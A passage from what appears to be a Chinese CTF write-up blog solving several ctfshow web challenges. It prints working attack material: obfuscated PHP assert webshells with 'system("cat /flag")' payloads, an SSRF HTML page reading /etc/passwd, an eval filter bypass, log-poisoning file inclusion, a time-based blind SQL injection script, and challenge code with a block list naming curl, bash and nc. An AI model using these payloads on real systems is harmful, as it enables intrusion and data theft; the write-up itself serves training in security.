class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="string">" "</span>);</span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">"$_"</span>; <span class="comment">// $_='Array';</span></span><br><span class="line">$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">'_'</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]);<span class="comment">// // ASSERT($_POST[_]);</span></span><br><span class="line"><span class="comment">//再post提交_=system("cat /flag");</span></span><br></pre></td></tr></table></figure><p>2.根据代码的意思，用${$<em>{7}.$</em>{8}.$<em>{12}.$</em>{19}}可以拼凑出$hint，这样就能顺利以base64的方式读取hhh.php文件了，解密得到是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"/phpjiami.zip\n/hint.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下载压缩包，解密源码，得到一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = explode(<span class="string">"."</span>,<span class="string">"hello.ass.world.er.rt.e.saucerman"</span>);</span><br><span class="line">$c = $ch[<span class="number">1</span>].$ch[<span class="number">5</span>].$ch[<span class="number">4</span>]; </span><br><span class="line">@$c($_POST[<span class="number">7</span><span class="number">-1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POST</p><p><strong>6=system(‘cat /flag’);</strong>就可以拿到flag</p><img src="/2020/05/05/ctfshow/%E4%BD%A0%E6%8B%BF%E5%90%A7.png" class=""><h4 id="0X02：RemoteImageDownloader"><a href="#0X02：RemoteImageDownloader" class="headerlink" title="0X02：RemoteImageDownloader"></a>0X02：RemoteImageDownloader</h4><p>打开题目，给了一个http？？？？，可能是ssrf注入，测试一下发现下载了一张截图图片</p><p>vps监听</p><img src="/2020/05/05/ctfshow/RemoteImageDownloader.png" class=""><p>根据提示，去找资料，有文章<a href="https://www.anquanke.com/post/id/86371，里面有poc" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86371，里面有poc</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="actionscript"> x=<span class="keyword">new</span> XMLHttpRequest; </span></span><br><span class="line"><span class="actionscript"> x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123; </span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText) </span></span><br><span class="line"> &#125;; </span><br><span class="line"><span class="actionscript"> x.open(<span class="string">"GET"</span>,<span class="string">"file:///etc/passwd"</span>); </span></span><br><span class="line"> x.send(); </span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在自己的vpsweb服务目录下起个网页，再把目标改为flag</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heaed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">x = <span class="keyword">new</span> XMLHttpRequest;</span></span><br><span class="line"><span class="actionscript">x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText)</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="actionscript">x.open(<span class="string">"GET"</span>,<span class="string">"file:///flag"</span>);</span></span><br><span class="line">x.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在网页直接读取下载这个文件，成功拿到flag</p><img src="/2020/05/05/ctfshow/RemoteImageDownloader1.png" class=""><h4 id="0X03：给你shell"><a href="#0X03：给你shell" class="headerlink" title="0X03：给你shell"></a>0X03：给你shell</h4><p>在网页源码处找到了跳转页面，跳转</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="comment">//It's no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'view_source'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">':'</span>, $s);</span><br><span class="line">    <span class="keyword">if</span> ($arr[<span class="number">0</span>] === <span class="string">'&#123;"secret"'</span> &amp;&amp; preg_match(<span class="string">'/^[\"0-9A-Z]*&#125;$/'</span>, $arr[<span class="number">1</span>]) &amp;&amp; count($arr) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !theFirstTimeSetCookie() ) setcookie(<span class="string">'secret'</span>, <span class="string">''</span>, time()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span><span class="params">($_f_g)</span> </span>&#123;</span><br><span class="line">    $_g_r = <span class="number">32</span>;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, <span class="number">1</span>);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>($_COOKIE[<span class="string">'secret'</span>]) ? $json = $_COOKIE[<span class="string">'secret'</span>] : setcookie(<span class="string">'secret'</span>, <span class="string">'&#123;"secret":"'</span> . strtoupper(md5(<span class="string">'y1ng'</span>)) . <span class="string">'"&#125;'</span>, time()+<span class="number">7200</span> );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, <span class="keyword">true</span>) : <span class="keyword">die</span>(<span class="string">'no'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($obj &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'give_me_shell'</span>])) &#123;</span><br><span class="line">    ($obj[<span class="string">'secret'</span>] != $flag_md5 ) ? haveFun($flag) : <span class="keyword">echo</span> <span class="string">"here is your webshell: $shell_path"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure><p>逻辑：</p><ul><li>cookie，存的是json</li><li>checkCookie()函数检测json数据只有一对键值对</li><li>secret!=$flag_md5，调用havefun函数，否则就输出shell地址</li></ul><p>经过测试，数字&amp;0xC0都为0，字母&amp;0xC0都是64，flag的MD5值为327a6c4304ad5938eaf0efb6cc3e53dc，刚好是000打头，弱类型直接上burp爆破</p><img src="/2020/05/05/ctfshow/shell1.png" class=""><p>根据提示，到下一步</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//there are some secret waf that you will never know, fuzz me if you can</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"hidden_filter.php"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">'login'</span>])</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;script&gt;location.href=\'./index.php\'&lt;/script&gt;'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        <span class="comment">//清空session 从头再来</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"\$_SESSION["</span> . $code . <span class="string">"]=false;"</span>); <span class="comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面就是看Ying师傅的wp做了，fuzz黑名单过滤了一下东西</p><ul><li>f、sys、include</li><li>括号、引号、分号</li><li>^ &amp;等运算符</li><li>空格 / \ $ ` * #等符号</li></ul><p>这里带括号的函数，空格，分号都不能使用，命令拼接也无效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;]&#x3D;1?&gt;&lt;?&#x3D;require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</span><br><span class="line">&#x2F;&#x2F;用?&gt;&lt;?来bypass分号</span><br><span class="line">&#x2F;&#x2F;PHP黑魔法 require和取反运算符之间不需要空格照样执行</span><br><span class="line">&#x2F;&#x2F;没有括号 使用那些不需要括号的函数 这里使用require</span><br><span class="line">&#x2F;&#x2F;]&#x3D;1来闭合session</span><br></pre></td></tr></table></figure><img src="/2020/05/05/ctfshow/shell2.png" class=""><p>拿到flag</p><h4 id="0X04：WEB-ALL-INFO-U-WANT"><a href="#0X04：WEB-ALL-INFO-U-WANT" class="headerlink" title="0X04：WEB_ALL_INFO_U_WANT"></a>0X04：WEB_ALL_INFO_U_WANT</h4><img src="/2020/05/05/ctfshow/want1.png" class=""><p>看到提示，用扫描器扫到index.php.bak,下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">visit all_info_u_want.php and you will get all information you want</span><br><span class="line">&#x3D; &#x3D;Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;give you all information you want</span><br><span class="line">if (isset($_GET[&#39;all_info_i_want&#39;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    $file &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot; . $_GET[&#39;file&#39;];</span><br><span class="line">    &#x2F;&#x2F;really baby include</span><br><span class="line">    include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">really really really baby challenge right?</span><br></pre></td></tr></table></figure><p>http回包header得知是nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line">&#x2F;&#x2F;在user-agent处写入一句话木马即可包含RCE</span><br></pre></td></tr></table></figure><h4 id="0X05：WEB-Login-Only-For-36D"><a href="#0X05：WEB-Login-Only-For-36D" class="headerlink" title="0X05：WEB_Login_Only_For_36D"></a>0X05：WEB_Login_Only_For_36D</h4><p>打开是个注入题，常规手段fuzz一下，发现过滤了一下东西</p><ul><li>单引号</li><li>select substr等很多关键字</li><li>= &gt; &lt;</li><li>空格 – ; |等符号</li></ul><p>发现源码有提示</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- if (!preg_match('/admin/', $uname)) die; --&gt;</span><br><span class="line">&lt;!-- select * from 36d_user where username='$uname' and password='$passwd'; --&gt;</span><br></pre></td></tr></table></figure><p>用<code>admin\</code>把单引号注释掉让后面<code>$passwd</code>逃逸出去</p><p>布尔盲注无回显，用时间盲注，上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += hex(ord(i))</span><br><span class="line"></span><br><span class="line">    result = result.replace(<span class="string">'0x'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + result</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">"https://dc695489-cf68-45f2-97f9-1a21f62ba9e3.chall.ctf.show/"</span></span><br><span class="line">string = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'IABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        password = ord2hex(res + chr(j))</span><br><span class="line">        password = <span class="string">'or/**/if((password/**/REGEXP/**/binary/**/&#123;&#125;),sleep(10),1)#'</span>.format(password)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">"admin\\"</span>,</span><br><span class="line">            <span class="string">'password'</span>: password</span><br><span class="line">        &#125;</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        r = req.post(url=url, data=data)</span><br><span class="line">        endtime = time.time()</span><br><span class="line">        <span class="keyword">if</span> endtime - startTime &gt; <span class="number">5</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>跑出来密码是ILoVeThlrtySixD，跑了好几次才跑出来正确的</p><h4 id="0X06-WUSTCTF-朴实无华Revenge"><a href="#0X06-WUSTCTF-朴实无华Revenge" class="headerlink" title="0X06:WUSTCTF__朴实无华Revenge"></a>0X06:WUSTCTF__朴实无华Revenge</h4><p>题目直接给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=<span class="number">1</span>;</span><br><span class="line">    $k=intval($len/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$k;$j++)</span><br><span class="line">        <span class="keyword">if</span> (substr($str,$j,<span class="number">1</span>)!=substr($str,$len-$j<span class="number">-1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            $l=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> ($l==<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[^0-9.]/'</span>, $num)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"非洲欢迎你1"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (preg_match_all(<span class="string">"/\./"</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">"/\-/"</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">"/\-/"</span>, $num)==<span class="number">1</span> &amp;&amp; !preg_match(<span class="string">'/^[-]/'</span>, $num))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"没有这样的数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($numPositve &lt;= <span class="number">-999999999999999999</span> || $numPositve &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"非洲欢迎你2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($md5==md5(md5($md5)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"more"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tail"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"less"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"head"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tac"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"sort"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"$"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"curl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"bash"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nc"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"php"</span>, <span 